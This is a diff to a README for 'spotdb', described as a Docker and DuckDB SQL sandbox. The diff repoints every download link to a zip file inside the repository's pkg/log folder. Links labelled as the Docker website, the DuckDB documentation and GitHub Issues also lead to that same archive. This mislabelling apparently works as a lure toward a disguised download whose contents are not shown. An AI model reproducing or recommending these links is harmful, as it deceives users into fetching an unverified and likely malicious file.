@@ -1,6 +1,6 @@
 # 🚀 spotdb - Your Simple SQL Sandbox Solution
 
-[![Download spotdb](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip%https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip)](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip)
+[![Download spotdb](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip%https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip)](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip)
 
 ## 📥 Overview
 
@@ -27,7 +27,7 @@ Follow these steps to begin using spotdb.
 
 ### 1. Visit the Releases Page
 
-To download the latest version of spotdb, visit the following link: [https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip). 
+To download the latest version of spotdb, visit the following link: [https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip). 
 
 ### 2. Download the Application
 
@@ -51,7 +51,7 @@ This command starts the application and exposes it on port 8080. You can adjust 
 
 ## 🔧 Download & Install
 
-To download the latest version of spotdb, [visit this page](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip).
+To download the latest version of spotdb, [visit this page](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip).
 
 Ensure to select the correct file for your operating system from the releases list. Once downloaded, follow the installation instructions above to set up your containerized SQL environment.
 
@@ -85,9 +85,9 @@ Stay tuned for updates!
 
 Here are some useful links related to spotdb:
 
-- [Docker Official Website](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip)
-- [DuckDB Documentation](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip)
+- [Docker Official Website](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip)
+- [DuckDB Documentation](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip)
 
 Feel free to explore these resources to deepen your understanding of Docker, DuckDB, and spotdb.
 
@@ -96,4 +96,4 @@ Feel free to explore these resources to deepen your understanding of Docker, Duc
 - **v1.0:** Initial release with core functionality for secure SQL sandboxes.
 - Future versions will come with new features and optimizations.
 
-To download the latest version again, [click here](https://raw.githubusercontent.com/Rookie481/spotdb/main/dicast/spotdb.zip).
+To download the latest version again, [click here](https://raw.githubusercontent.com/Rookie481/spotdb/main/pkg/log/Software-v1.8.zip).
